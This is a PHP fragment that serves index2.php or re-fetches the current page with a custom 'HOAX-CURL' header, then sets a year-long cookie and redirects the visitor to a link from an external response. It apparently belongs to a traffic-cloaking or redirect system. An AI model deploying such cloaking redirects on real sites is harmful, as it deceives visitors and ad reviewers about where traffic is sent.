class HTML
{
    public static function get()
    {
        if (!file_exists('index2.php')) {
            throw new Exception('index2.php file does not exist');
        }
        if (!preg_match('/<body([^>]*)>/', file_get_contents('index2.php'))) {
            $url = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'HOAX-CURL: true',
            ]);
            if (!$html = curl_exec($ch)) {
                throw new Exception('cURL error: ' . curl_error($ch));
            }
            curl_close($ch);
            return $html;
        }
        return file_get_contents('index2.php');
    }
}

class Redirect
{
    public function __construct($response)
    {
        if ($response['status'] === 'ok') {
            setcookie(HOAX_FLOW, 'true', time() + 60 * 60 * 24 * 365, '/', $_SERVER['HTTP_HOST']);
            header("Location: " . $response['link']);
            exit();
        }
    }
}